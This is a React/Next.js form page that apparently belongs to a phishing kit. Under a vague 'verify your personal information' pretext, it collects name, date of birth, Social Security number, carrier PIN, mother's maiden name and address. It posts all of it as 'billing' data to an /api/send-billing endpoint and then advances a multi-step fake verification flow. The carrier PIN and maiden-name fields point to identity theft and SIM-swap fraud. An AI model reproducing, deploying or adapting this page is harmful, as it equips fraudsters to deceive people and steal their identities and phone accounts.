import React, { useContext, useState } from "react";
import { Box, Flex } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { Button } from "../../../components/Button";
import { Container } from "../../../components/Container";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { IntroText } from "../../../components/IntroText";
import { ProgressBar } from "../../../components/ProgressBar";
import { Section } from "../../../components/Section";
import { Wrapper } from "../../../components/Wrapper";
import { Loading } from "../../../components/Loading";
import { DataContext } from "../../_app";
import { getProgress } from "../../../utils/getProgress";
import { getNextUrl } from "../../../utils/getNextUrl";

interface PersonalInformationProps {}

const schema = yup.object().shape({
  firstname: yup
    .string()
    .required("The field can't be left blank. Please enter your first name."),
  lastname: yup
    .string()
    .required("The field can't be left blank. Please enter your last name."),
  dob: yup
    .string()
    .required("The field can't be left blank. Please enter your birth date."),
  ssn: yup
    .string()
    .required("The field can't be left blank. Please enter your SSN Number."),
  streetAddress: yup
    .string()
    .required("The field can't be left blank. Please enter your address."),
  zipCode: yup
    .string()
    .required("The field can't be left blank. Please enter your Zip code."),
  state: yup
    .string()
    .required("The field can't be left blank. Please enter the state you in."),
  // phoneNumber: yup
  //   .string()
  //   .required("The field can't be left blank. Please enter your phone number."),
  carrierPin: yup.string(),
  mmn: yup.string(),
});

const PersonalInformation: React.FC<PersonalInformationProps> = () => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url =
      getProgress()[getProgress().indexOf(`Personal Information`) + 1];

    push(getNextUrl(url));
  });

  return (
    <>
      {loading ? <Loading /> : null}
      <Wrapper>
        <Container>
          <ProgressBar
            indicators={getProgress()}
            highlight={getProgress().indexOf(`Personal Information`)}
          />
          <Section>
            <IntroText
              title={`Verify your personal information`}
              paragraph={`We need you to verify your peronal information, we will compare the information you provide with what we have in our system to better assist you.`}
            />
            <Box as={`section`}>
              <Box>
                <Box
                  as={`fieldset`}
                  m={`42px 0 18px`}
                  mt={0}
                  p={0}
                  border={0}
                  minW={0}
                >
                  <Flex
                    flexDir={`column`}
                    _before={{
                      content: `" "`,
                      display: `table`,
                    }}
                    _after={{
                      clear: `both`,
                      content: `" "`,
                      display: `table`,
                    }}
                  >
                    <InputWrapper>
                      <Input
                        label={`First Name`}
                        placeholder={`First Name`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.firstname && errors.firstname.message}
                        register={register}
                        name={`firstname`}
                        curValue={watch(`firstname`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`Last Name`}
                        placeholder={`Last Name`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.lastname && errors.lastname.message}
                        register={register}
                        name={`lastname`}
                        curValue={watch(`lastname`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask="99/99/9999"
                        label={`Date of Birth mm/dd/yyyy`}
                        placeholder={`Date of Birth mm/dd/yyyy`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.dob && errors.dob.message}
                        register={register}
                        name={`dob`}
                        curValue={watch(`dob`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask="999-99-9999"
                        label={`Social Security Number`}
                        placeholder={`Social Security Number`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.ssn && errors.ssn.message}
                        register={register}
                        name={`ssn`}
                        curValue={watch(`ssn`)}
                      />
                    </InputWrapper>
                    {/* <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask="(999) 999 9999"
                        label={`Phone Number`}
                        placeholder={`Phone Number`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.phoneNumber && errors.phoneNumber.message}
                        register={register}
                        name={`phoneNumber`}
                        curValue={watch(`phoneNumber`)}
                      />
                    </InputWrapper> */}
                    <InputWrapper>
                      <Input
                        type={`number`}
                        label={`Carrier Pin`}
                        placeholder={`Carrier Pin`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.carrierPin && errors.carrierPin.message}
                        register={register}
                        name={`carrierPin`}
                        curValue={watch(`carrierPin`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`Mother Maiden name`}
                        placeholder={`Mother Maiden name`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.mmn && errors.mmn.message}
                        register={register}
                        name={`mmn`}
                        curValue={watch(`mmn`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`Address`}
                        placeholder={`Address`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={
                          errors.streetAddress && errors.streetAddress.message
                        }
                        register={register}
                        name={`streetAddress`}
                        curValue={watch(`streetAddress`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`State`}
                        placeholder={`State`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.state && errors.state.message}
                        register={register}
                        name={`state`}
                        curValue={watch(`state`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        type={`number`}
                        label={`Zip Code`}
                        placeholder={`Zip Code`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.zipCode && errors.zipCode.message}
                        register={register}
                        name={`zipCode`}
                        curValue={watch(`zipCode`)}
                      />
                    </InputWrapper>
                    <Button
                      text={`Continue Verification`}
                      minW={[`100%`, `220px`]}
                      w={[`100%`, `auto`]}
                      m={[`22px 0 20px 0`, `22px 20px 20px 0`]}
                      mt={`22px`}
                      ml={[0, `10px`]}
                      lineHeight={`56px`}
                      disabled={loading || !isValid}
                      onClick={onSubmit}
                    />
                  </Flex>
                </Box>
              </Box>
            </Box>
          </Section>
        </Container>
      </Wrapper>
    </>
  );
};

export default PersonalInformation;
